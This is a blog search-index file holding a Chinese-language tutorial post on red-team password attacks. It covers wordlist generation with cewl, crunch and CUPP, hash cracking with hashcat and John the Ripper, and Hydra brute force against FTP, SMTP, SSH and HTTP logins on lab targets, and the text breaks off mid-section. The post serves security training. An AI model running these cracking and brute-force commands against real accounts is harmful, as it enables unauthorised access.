<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Red Team Password Attacks</title>
      <link href="/2024/04/29/Red-Team-Password-Attacks/"/>
      <url>/2024/04/29/Red-Team-Password-Attacks/</url>
      
        <content type="html"><![CDATA[<h1 id="密碼攻擊"><a href="#密碼攻擊" class="headerlink" title="密碼攻擊"></a>密碼攻擊</h1><h2 id="密碼攻擊技術"><a href="#密碼攻擊技術" class="headerlink" title="密碼攻擊技術"></a>密碼攻擊技術</h2><blockquote><p>密碼破解是一種用於從加密或雜湊資料到明文資料發現密碼的技術。攻擊者可能會從受感染的電腦取得加密或雜湊的密碼，或透過網路傳輸資料來擷取它們。一旦獲得密碼，攻擊者就可以利用密碼攻擊技術，使用各種工具破解這些雜湊密碼。</p></blockquote><ul><li>密碼猜測<blockquote><p>密碼猜測是一種針對在線協定和服務的攻擊方法。它通常涉及到向網站或服務發送多次登入請求，每次請求嘗試不同的密碼組合。<br>耗時性：這種方法通常是耗時的，因為攻擊者需要反覆嘗試直到找到正確的密碼。<br>可檢測性：由於每次嘗試都需要發送新的請求，這種攻擊容易被系統偵測到。系統可以通過分析來自同一來源的頻繁登入嘗試來識別攻擊。<br>對策：為防止密碼猜測，許多系統會實施帳戶鎖定政策或延遲回應策略，當檢測到多次失敗的登入嘗試時暫時鎖定帳戶或增加回應時間。</p></blockquote></li><li>密碼破解<blockquote><p>密碼破解則是在本地或由攻擊者控制的系統上執行的一種技術。通常涉及到使用先進的計算技術和算法在沒有在線交互的情況下嘗試破解密碼。<br>資源密集：這種方法可能需要大量的計算資源，尤其是當使用如GPU加速的密碼破解軟件時。<br>離線執行：與密碼猜測不同，密碼破解通常在攻擊者的控制環境中離線進行，這意味著它不依賴於對目標系統的在線請求，減少了被偵測的風險。<br>使用場景：當攻擊者獲得了密碼的哈希值（例如通過數據泄漏或系統入侵）時，他們可能會使用密碼破解技術來嘗試恢復原始的明文密碼。。</p></blockquote></li></ul><h2 id="密碼分析-1-預設、弱、洩漏、組合和用戶名單字列表"><a href="#密碼分析-1-預設、弱、洩漏、組合和用戶名單字列表" class="headerlink" title="密碼分析 1 -(預設、弱、洩漏、組合和用戶名單字列表)"></a>密碼分析 1 -(預設、弱、洩漏、組合和用戶名單字列表)</h2><h3 id="默認預設密碼"><a href="#默認預設密碼" class="headerlink" title="默認預設密碼"></a>默認預設密碼</h3><h4 id="參考網站"><a href="#參考網站" class="headerlink" title="參考網站"></a>參考網站</h4><ul><li><a href="https://cirt.net/passwords">default-password-1</a></li><li><a href="https://default-password.info/">default-password-2</a></li><li><a href="https://datarecovery.com/rd/default-passwords/">default-password-3</a></li></ul><h3 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h3><h4 id="參考網站-1"><a href="#參考網站-1" class="headerlink" title="參考網站"></a>參考網站</h4><ul><li><a href="https://wiki.skullsecurity.org/index.php?title=Passwords">各網站弱密碼</a></li><li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">github-SecLists弱密碼</a></li></ul><h3 id="洩漏密碼"><a href="#洩漏密碼" class="headerlink" title="洩漏密碼"></a>洩漏密碼</h3><h4 id="參考網址"><a href="#參考網址" class="headerlink" title="參考網址"></a>參考網址</h4><ul><li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases">github-SecLists洩漏密碼</a></li></ul><h3 id="整理密碼列表"><a href="#整理密碼列表" class="headerlink" title="整理密碼列表"></a>整理密碼列表</h3><h4 id="合併密碼列表"><a href="#合併密碼列表" class="headerlink" title="合併密碼列表"></a>合併密碼列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file1.txt file2.txt file3.txt &gt; combined_list.txt</span><br></pre></td></tr></table></figure><h4 id="移除重複的密碼"><a href="#移除重複的密碼" class="headerlink" title="移除重複的密碼"></a>移除重複的密碼</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort combined_list.txt | uniq -u &gt; cleaned_combined_list.txt</span><br></pre></td></tr></table></figure><blockquote><p>sort combined_list.txt：这个命令将 combined_list.txt 文件中的所有行进行排序。按字母或数字顺序对文件的行进行排序。排序是去除重复内容的预处理步骤，因为 uniq 命令需要在已排序的输入上运行才能正确地检测和删除重复行。<br>uniq -u：uniq 命令用于从输入中删除重复的连续行。-u 选项指令 uniq 只输出那些未重复的行，也就是说，它会删除所有出现多次的行，只保留独一无二的行。如果不使用 -u 选项，uniq 默认只是合并重复的连续行为一行，并不移除它们。</p></blockquote><h3 id="定製字典"><a href="#定製字典" class="headerlink" title="定製字典"></a>定製字典</h3><blockquote><p>定制密码列表是提高找到有效凭证机会的最佳方式之一。我们可以从目标网站创建定制的密码列表。通常，一家公司的网站包含了关于公司及其员工的宝贵信息，包括电子邮件和员工姓名。此外，网站可能包含与公司所提供的产品和服务相关的特定关键词，这些关键词可能被员工用于其密码中！</p></blockquote><h4 id="工具-cewl"><a href="#工具-cewl" class="headerlink" title="工具:cewl"></a>工具:cewl</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w list.txt -d 5 -m 5 http://thm.labs</span><br></pre></td></tr></table></figure><blockquote><p>-w 选项将内容写入文件。在这种情况下，文件名为 list.txt。<br>-m 5 收集5个字符或更多的字符串（单词）<br>-d 5 是网页爬取&#x2F;蜘蛛（spidering）的深度级别（默认为2）<br><a href="http://thm.labs/">http://thm.labs</a> 是将要使用的URL<br><img src="/photo/Red_Team_passwordarttack/1.jpg" alt="1"></p></blockquote><h3 id="用戶名字典"><a href="#用戶名字典" class="headerlink" title="用戶名字典"></a>用戶名字典</h3><h4 id="工具-username-generator下載網址"><a href="#工具-username-generator下載網址" class="headerlink" title="工具:username_generator下載網址"></a>工具:username_generator下載網址</h4><blockquote><p><a href="https://github.com/shroudri/username_generator">username_generator</a></p></blockquote><h4 id="範例"><a href="#範例" class="headerlink" title="範例"></a>範例</h4><blockquote><p>查看工具參數說明</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 username_generator.py -h</span><br></pre></td></tr></table></figure><blockquote><p>將要輸入的名字放入字典中</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;John Smith&quot; &gt; users.lst</span><br><span class="line">python3 username_generator.py -w users.lst</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Red_Team_passwordarttack/2.jpg" alt="2"></p></blockquote><h2 id="密碼分析-2-鍵空間技術和-CUPP"><a href="#密碼分析-2-鍵空間技術和-CUPP" class="headerlink" title="密碼分析 2 -(鍵空間技術和 CUPP)"></a>密碼分析 2 -(鍵空間技術和 CUPP)</h2><h3 id="鍵空间技術"><a href="#鍵空间技術" class="headerlink" title="鍵空间技術"></a>鍵空间技術</h3><h4 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>键空间技术是在密码破解中使用的一种方法，它涉及到生成所有可能的密码组合来覆盖特定的字符集。这种技术常用于创建词表或进行暴力破解，特别是当未知密码的确切构成时。使用键空间技术可以确保尝试了所有可能的组合，从而最大化破解密码的机会。<br>键空间技术的工作原理：<br>定义字符集：首先确定密码可能包含的字符，例如小写字母、大写字母、数字和特殊符号。<br>设置长度范围：确定密码的最小和最大长度。例如，可能知道密码至少有6个字符，最多有12个字符。<br>生成组合：使用所选字符集和长度范围生成所有可能的密码组合。</p></blockquote><h4 id="鍵空間技術優缺點"><a href="#鍵空間技術優缺點" class="headerlink" title="鍵空間技術優缺點"></a>鍵空間技術優缺點</h4><blockquote><p>使用键空间技术的优点：<br>全面性：这种方法确保了尝试每一种可能的组合，不遗漏任何潜在的密码。<br>灵活性：可以根据已知信息调整字符集和长度，如排除不可能的字符或设置更具体的长度范围。<br>缺点：<br>资源消耗：生成大量组合需要大量计算资源，特别是当字符集大和密码长度长时。<br>时间消耗：尝试所有可能的组合可能需要非常长的时间，尤其是对于复杂的密码。</p></blockquote><h3 id="鍵空间技術應用-crunch"><a href="#鍵空间技術應用-crunch" class="headerlink" title="鍵空间技術應用(crunch)"></a>鍵空间技術應用(crunch)</h3><blockquote><p>查看可使用參數</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch -h</span><br></pre></td></tr></table></figure><blockquote><p>基礎用法</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 8 8 0123456789abcdefABCDEF -o crunch.txt</span><br></pre></td></tr></table></figure><blockquote><p>最小長度:8<br>最大長度:8<br>“0123456789abcdefABCDEF”為組成元素<br>-o crunch.txt:儲存到crunch.txt<br><img src="/photo/Red_Team_passwordarttack/3.jpg" alt="3"></p></blockquote><blockquote><p>crunch 還允許我們使用 -t 選項指定字符集，以組合我們選擇的單詞</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 5 5 -t a@,:^</span><br></pre></td></tr></table></figure><ul><li>@  : 小寫字母</li><li>,  : 大寫字母</li><li>%  : 數字字符</li><li>^  : 包括空格在內的特殊字符<br><img src="/photo/Red_Team_passwordarttack/4.jpg" alt="4"></li></ul><h3 id="CUPP"><a href="#CUPP" class="headerlink" title="CUPP"></a>CUPP</h3><h4 id="簡介-1"><a href="#簡介-1" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>CUPP（Common User Passwords Profiler）是一款用 Python 編寫的自動化和互動式工具，用於創建自定義詞表。</p></blockquote><h4 id="網址"><a href="#網址" class="headerlink" title="網址"></a>網址</h4><blockquote><p><a href="https://github.com/Mebus/cupp">CUPP</a></p></blockquote><h4 id="示範"><a href="#示範" class="headerlink" title="示範"></a>示範</h4><blockquote><p>查詢參數</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -h</span><br></pre></td></tr></table></figure><blockquote><p>啟動對話模式<br>如果關於目標問題你沒有答案，按Enter鍵來跳過</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -i</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Red_Team_passwordarttack/5.jpg" alt="5"><br>1337&#x2F;leet模式，可以將字母 a, i, e, t, o, s, g, z 替換為數字。例如，將 a 替換為 4 或將 i 替換為 1。</p></blockquote><blockquote><p>使用cupp預設詞表</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -l</span><br></pre></td></tr></table></figure><blockquote><p>選擇主題<br><img src="/photo/Red_Team_passwordarttack/6.jpg" alt="6"></p></blockquote><blockquote><p>使用 -a 選項從 Alecto 數據庫提供默認的用戶名和密碼</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -a</span><br></pre></td></tr></table></figure><blockquote><p>Alecto數據庫是CUPP一個包含眾多常見或預設使用者名稱和密碼的數據庫。<br><img src="/photo/Red_Team_passwordarttack/7.jpg" alt="7"></p></blockquote><h4 id="小試身手"><a href="#小試身手" class="headerlink" title="小試身手"></a>小試身手</h4><p><img src="/photo/Red_Team_passwordarttack/8.jpg" alt="8"></p><h2 id="離線攻擊-字典和暴力破解"><a href="#離線攻擊-字典和暴力破解" class="headerlink" title="離線攻擊 -(字典和暴力破解)"></a>離線攻擊 -(字典和暴力破解)</h2><h3 id="字典攻擊"><a href="#字典攻擊" class="headerlink" title="字典攻擊"></a>字典攻擊</h3><h4 id="簡介-2"><a href="#簡介-2" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>字典攻擊是一種通過使用常見的單詞或短語來猜測密碼的技術。字典攻擊完全依賴於事先收集好的字典，這些字典是之前生成或找到的。</p></blockquote><h3 id="示範-字典攻擊hash-identifier-hashcat"><a href="#示範-字典攻擊hash-identifier-hashcat" class="headerlink" title="示範(字典攻擊hash-identifier&amp;hashcat)"></a>示範(字典攻擊hash-identifier&amp;hashcat)</h3><blockquote><p>假設我們獲得了以下哈希 f806fc5a2a0d5ba2471600758452799c，並希望通過字典攻擊來破解它。首先，我們至少需要知道以下信息：</p><ul><li>這是什麼類型的哈希？</li><li>我們將使用什麼單詞列表？或者我們可以使用什麼類型的攻擊模式？</li></ul></blockquote><h4 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h4><blockquote><p>要識別哈希的類型，我們可以使用像 hashid 或 hash-identifier 這樣的工具。對於這個例子，hash-identifier 認為可能的哈希方法是 MD5。<br><img src="/photo/Red_Team_passwordarttack/9.jpg" alt="9"></p></blockquote><h4 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h4><blockquote><p>hashcat是一個用於破解哈希值的強大工具，可以進行各種類型的攻擊，包括字典攻擊、暴力破解和組合攻擊等，破解哈希所需的時間將取決於你使用的硬件（CPU 和&#x2F;或 GPU）<br>查看有哪些CPU和GPU</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -I</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Red_Team_passwordarttack/10.jpg" alt="10"></p></blockquote><blockquote><p>開始破解</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -d 1 -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><blockquote><p>-d 1 選擇id 1的CPU&#x2F;GPU<br>-a 0 設置攻擊模式為字典攻擊。<br>-m 0 設置用於破解 MD5 哈希的哈希模式；對於其他類型的哈希，運行 hashcat -h 查看支持的哈希列表。<br>f806fc5a2a0d5ba2471600758452799c 這個選項可以是單個哈希，就像我們的例子一樣，也可以是包含一個哈希或多個哈希的文件。<br>&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 是我們攻擊所使用的字典文件。<br><img src="/photo/Red_Team_passwordarttack/11.jpg" alt="11"></p></blockquote><blockquote><p>運行 –show顯示已有被破過的哈希值</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Red_Team_passwordarttack/12.jpg" alt="12"></p></blockquote><h3 id="暴力破解攻擊"><a href="#暴力破解攻擊" class="headerlink" title="暴力破解攻擊"></a>暴力破解攻擊</h3><h4 id="簡介-3"><a href="#簡介-3" class="headerlink" title="簡介"></a>簡介</h4><blockquote><p>暴力破解是攻擊者常用的一種攻擊手段，用於未經授權地訪問個人帳戶。這種方法通過發送標準密碼組合來猜測受害者的密碼。字典攻擊與暴力破解攻擊的主要區別在於，字典攻擊使用包含所有可能密碼的詞表。相比之下，暴力破解攻擊旨在嘗試字符或字符的所有組合。</p></blockquote><h3 id="暴力破解攻擊-hashcat"><a href="#暴力破解攻擊-hashcat" class="headerlink" title="暴力破解攻擊(hashcat)"></a>暴力破解攻擊(hashcat)</h3><blockquote><p>查看可使用的參數</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat --help</span><br></pre></td></tr></table></figure><ul><li>? | Charset</li><li>l | abcdefghijklmnopqrstuvwxyz</li><li>u | ABCDEFGHIJKLMNOPQRSTUVWXYZ</li><li>d | 0123456789</li><li>h | 0123456789abcdef</li><li>H | 0123456789ABCDEF</li><li>s |  !”#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_`{|}~</li><li>a | ?l?u?d?s</li><li>b | 0x00 - 0xff</li></ul><blockquote><p>列出所選的組合</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 ?d?d?d?d --stdout</span><br></pre></td></tr></table></figure><ul><li>-a 3 設定攻擊模式為暴力破解攻擊</li><li>?d?d?d?d 從 0000 開始到 9999 結束的四位數字</li><li>–stdout 將結果打印到終端</li></ul><h3 id="示範-暴力攻擊hashcat"><a href="#示範-暴力攻擊hashcat" class="headerlink" title="示範(暴力攻擊hashcat)"></a>示範(暴力攻擊hashcat)</h3><blockquote><p>破解以下 MD5 哈希值：05A5CF06982BA7892ED2A6D38FE832D6，一個四位數的 PIN 碼。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -d 1 -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d</span><br></pre></td></tr></table></figure><p><img src="/photo/Red_Team_passwordarttack/13.jpg" alt="13"></p><h3 id="小試身手-1"><a href="#小試身手-1" class="headerlink" title="小試身手"></a>小試身手</h3><p><img src="/photo/Red_Team_passwordarttack/14.jpg" alt="14"></p><h2 id="離線攻擊-基於規則的"><a href="#離線攻擊-基於規則的" class="headerlink" title="離線攻擊 -(基於規則的)"></a>離線攻擊 -(基於規則的)</h2><h3 id="簡介-4"><a href="#簡介-4" class="headerlink" title="簡介"></a>簡介</h3><blockquote><p>基於規則的攻擊也被稱為混合攻擊。基於規則的攻擊假設攻擊者對密碼政策有所了解。規則被應用來在給定的密碼政策指南範圍內創建密碼，理論上應該只生成有效的密碼。使用現有的詞表在生成符合政策的密碼時可能很有用 — 例如，對密碼進行操作或「變形」，比如將 ‘password’ 變形為 ‘p@ssword’、’Pa$$word’、’Passw0rd’</p></blockquote><h3 id="John-the-ripper混合攻擊"><a href="#John-the-ripper混合攻擊" class="headerlink" title="John the ripper混合攻擊"></a>John the ripper混合攻擊</h3><blockquote><p>通常，John the Ripper 有一個包含規則集的配置文件，這個文件可能位於 &#x2F;etc&#x2F;john&#x2F;john.conf 或 &#x2F;opt&#x2F;john&#x2F;john.conf。你可以讀取 &#x2F;etc&#x2F;john&#x2F;john.conf，並查找 List.Rules 來查看所有可用的規則</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/john/john.conf|grep &quot;List.Rules:&quot; | cut -d&quot;.&quot; -f3 | cut -d&quot;:&quot; -f2 | cut -d&quot;]&quot; -f1 | awk NF</span><br></pre></td></tr></table></figure><p><img src="/photo/Red_Team_passwordarttack/15.jpg" alt="15"></p><blockquote><p>使用規則</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l</span><br></pre></td></tr></table></figure><ul><li>–wordlist&#x3D; 用來指定詞表或字典文件。</li><li>–rules 用來指定要使用的規則或多個規則。</li><li>–stdout 用來將輸出打印到終端。</li><li>wc -l 用來計算 John 生成了多少行<blockquote><p>原本179個，使用規則後增加到13318個<br><img src="/photo/Red_Team_passwordarttack/16.jpg" alt="16"></p></blockquote></li></ul><h4 id="KoreLogic"><a href="#KoreLogic" class="headerlink" title="KoreLogic"></a>KoreLogic</h4><blockquote><p>KoreLogic 是一種用於密碼破解的規則集，它利用多種內置的和自定義的規則來創建複雜的密碼列表。這可以幫助測試和破解加密的密碼。</p></blockquote><h5 id="規則集內容網址"><a href="#規則集內容網址" class="headerlink" title="規則集內容網址"></a>規則集內容網址</h5><blockquote><p><a href="https://contest-2010.korelogic.com/rules.html">KoreLogic</a></p></blockquote><h5 id="示範-1"><a href="#示範-1" class="headerlink" title="示範"></a>示範</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=single-password-list.txt --rules=KoreLogic --stdout</span><br></pre></td></tr></table></figure><p><img src="/photo/Red_Team_passwordarttack/17.jpg" alt="17"></p><h4 id="自定義規則"><a href="#自定義規則" class="headerlink" title="自定義規則"></a>自定義規則</h4><blockquote><p>John the Ripper 提供了很多功能。例如，我們可以構建自己的規則，在 John 正在破解哈希時實時使用，或者使用該規則來構建自定義詞表！</p></blockquote><blockquote><p>編輯john.conf，將自定義規則加入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/john/john.conf</span><br></pre></td></tr></table></figure><p>添加規則(例如):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[List.Rules:THM-Password-Attacks] </span><br><span class="line">Az&quot;[0-9]&quot; ^[!@#$]</span><br></pre></td></tr></table></figure><blockquote><p>[List.Rules:THM-Password-Attacks] 指定規則名稱為 THM-Password-Attacks。<br>Az 代表原始詞表&#x2F;字典中的一個單詞<br>“[0-9]” 在單詞末尾追加一個數字（從 0 到 9）。若要添加兩個數字，可以添加 “[0-9][0-9]”，依此類推。<br>^[!@#$] 在每個單詞的開始處添加一個特殊字符。^ 表示行&#x2F;單詞的開始。注意，將 ^ 改為 $ 將會在行&#x2F;單詞的結尾處追加特殊字符。</p></blockquote><blockquote><p>John 命令中使用 –rules 選項來包含我們創建的規則名稱。我們還需要在終端顯示結果。我們可以通過使用 –stdout 來實現</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout </span><br></pre></td></tr></table></figure><p><img src="/photo/Red_Team_passwordarttack/18.jpg" alt="18"></p><h4 id="小試身手-2"><a href="#小試身手-2" class="headerlink" title="小試身手"></a>小試身手</h4><p><img src="/photo/Red_Team_passwordarttack/19.jpg" alt="19"></p><ul><li>John the Ripper 的規則語法中，^[!@] 用於表示在每個單詞的開始處添加指定的符號。</li><li>AZ為單字</li></ul><h2 id="部署虛擬機"><a href="#部署虛擬機" class="headerlink" title="部署虛擬機"></a>部署虛擬機</h2><blockquote><p>開啟受害虛擬機<br>在攻擊機上生成關於此機器的密碼，根據提示密碼是關於<a href="https://clinic.thmredteam.com/">https://clinic.thmredteam.com/</a> 網頁上的內容</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/</span><br></pre></td></tr></table></figure><blockquote><p>生成使用者字典</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 cupp.py -a</span><br><span class="line">cp alectodb-usernames.txt ~/alectodb-usernames.txt</span><br></pre></td></tr></table></figure><h2 id="線上密碼攻擊"><a href="#線上密碼攻擊" class="headerlink" title="線上密碼攻擊"></a>線上密碼攻擊</h2><h3 id="Hydra破解FTP"><a href="#Hydra破解FTP" class="headerlink" title="Hydra破解FTP"></a>Hydra破解FTP</h3><h4 id="FTP簡介"><a href="#FTP簡介" class="headerlink" title="FTP簡介"></a>FTP簡介</h4><blockquote><p>FTP（File Transfer Protocol，文件傳輸協議）是一種用於在網絡上的計算機之間傳輸文件的標準網絡協議。它允許用戶和伺服器之間進行文件共享、上傳和下載。</p></blockquote><blockquote><p>FTP 的主要特點包括：</p></blockquote><ul><li>用戶認證：FTP 通常需要用戶登入，使用用戶名和密碼進行認證，但也可以配置為允許匿名訪問。<blockquote><p>兩種模式：</p></blockquote></li><li>主動模式：服務器嘗試連接到客戶端指定的任意端口。</li><li>被動模式：客戶端連接到服務器指定的端口，更適合客戶端位於防火牆後的情況。</li></ul><h4 id="hydra破解FTP語法"><a href="#hydra破解FTP語法" class="headerlink" title="hydra破解FTP語法"></a>hydra破解FTP語法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l ftp -P passlist.txt ftp://10.10.x.x</span><br></pre></td></tr></table></figure><blockquote><p>-l ftp 我們正在指定一個單一的用戶名，使用 -L 指定用戶名詞表<br>-P 路徑 指定詞表的完整路徑，使用 -p 可以指定單一密碼。<br><a href="ftp://10.10.x.x/">ftp://10.10.x.x</a> 協議和目標的 IP 地址或完全合格的域名（FDQN）。<br>有時候你不需要進行暴力破解，可以先嘗試默認的憑證。嘗試攻擊附加虛擬機上的 FTP 服務器</p></blockquote><h3 id="Hydra破解SMTP伺服器"><a href="#Hydra破解SMTP伺服器" class="headerlink" title="Hydra破解SMTP伺服器"></a>Hydra破解SMTP伺服器</h3><h4 id="SMTP簡介"><a href="#SMTP簡介" class="headerlink" title="SMTP簡介"></a>SMTP簡介</h4><blockquote><p>SMTP（Simple Mail Transfer Protocol，簡單郵件傳輸協議）是一種用於發送和轉發電子郵件的互聯網標準協議。</p></blockquote><ul><li>電子郵件客戶端到伺服器：SMTP 用於管理從郵件客戶端（如 Outlook、Apple Mail 等）發送到郵件伺服器的郵件。</li><li>伺服器到伺服器：在電子郵件的傳輸過程中，SMTP 負責處理從發送方郵件伺服器到接收方郵件伺服器的郵件轉發。</li><li>發送大量電子郵件：企業和營銷活動常常通過 SMTP 伺服器發送大量推廣和通知郵件。</li></ul><h4 id="Hydra破解SMTP伺服器語法"><a href="#Hydra破解SMTP伺服器語法" class="headerlink" title="Hydra破解SMTP伺服器語法"></a>Hydra破解SMTP伺服器語法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v</span><br></pre></td></tr></table></figure><blockquote><p>-v 選項代表「詳細模式」（verbose mode）。這意味著當命令執行時，Hydra 會顯示更詳細的輸出信息</p></blockquote><h3 id="Hydra破解SSH語法"><a href="#Hydra破解SSH語法" class="headerlink" title="Hydra破解SSH語法"></a>Hydra破解SSH語法</h3><h4 id="SSH簡介"><a href="#SSH簡介" class="headerlink" title="SSH簡介"></a>SSH簡介</h4><blockquote><p>SSH（Secure Shell）是一種網絡協議，用於在不安全的網絡中安全地進行遠程登錄和其他網絡服務。SSH 提供了一個加密的通道，允許用戶安全地與遠程機器交換數據。這個協議主要用於遠程控制系統和管理服務器，同時也被用於在任何不安全的網絡中傳輸機密資料。</p></blockquote><ul><li>加密連接：SSH 通過各種加密技術，如公鑰加密和對稱加密，來保護通過網絡傳輸的數據免遭竊聽和篡改。</li><li>用戶身份驗證：SSH 支持多種身份驗證機制，包括密碼、公鑰和基於主機的身份驗證。</li><li>數據完整性：SSH 使用消息認證碼（MAC）來確保數據在傳輸過程中未被篡改。</li><li>端口轉發：SSH 允許端口轉發，通過這種方式，SSH 用戶可以安全地將網絡服務連接到遠程機器，或從遠程機器連接回本地機器。</li><li>SFTP：SSH 文件傳輸協議（SFTP）是一種安全的文件傳輸協議，通過 SSH 通道提供文件訪問、文件傳輸和文件管理功能</li></ul><h4 id="Hydra破解SSH"><a href="#Hydra破解SSH" class="headerlink" title="Hydra破解SSH"></a>Hydra破解SSH</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v</span><br></pre></td></tr></table></figure><h3 id="Hydra破解HTTP登陸頁面"><a href="#Hydra破解HTTP登陸頁面" class="headerlink" title="Hydra破解HTTP登陸頁面"></a>Hydra破解HTTP登陸頁面</h3><h4 id="破解前置流程"><a href="#破解前置流程" class="headerlink" title="破解前置流程"></a>破解前置流程</h4><blockquote><p>在破解前，首先你需要了解你正在破解的內容。</p></blockquote><ul><li>指定HTTP請求的類型，無論是 GET 還是 POST。<blockquote><p>例如查看 Hydra 的選項http-get-form：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra http-get-form -U</span><br></pre></td></tr></table></figure><blockquote><p>Hydra 的選項http-get-form有以下語法：<br><url>:<form parameters>:<condition string>[:<optional>[:<optional>]]</p></blockquote></li></ul><blockquote><p>&lt;url&gt;：<br>這是表單提交的 URL。它是攻擊目標表單的路徑，比如 <a href="http://example.com/login">http://example.com/login</a>.<br>&lt;form parameters&gt;：<br>這部分定義了表單中需要填寫的參數。格式通常為 username&#x3D;^USER^&amp;password&#x3D;^PASS^，其中 ^USER^ 和 ^PASS^ 是由 Hydra 替換的佔位符，分別代表用戶名和密碼的位置。<br>&lt;condition string&gt;：<br>這是用來判斷響應是否為成功登錄的條件。例如，如果登錄失敗頁面包含“錯誤”的文字，則條件字符串可能是 F&#x3D;錯誤；如果登錄成功，頁面可能會重定向或顯示某些特定文字，如 S&#x3D;歡迎.<br>[:&lt;optional&gt;]：<br>這是可選參數，可以根據需要添加。例如，指定使用的 HTTP 方法（GET 或 POST），或額外的 HTTP 標頭，或者對某些特定表單動作的特殊處理。<br>[:&lt;optional&gt;]：<br>第二個可選字段，可以用於提供更多的自定義選項，如 cookie 支持或其他自定義需求。</p></blockquote><blockquote><p>我們需要分析我們需要發送的 HTTP 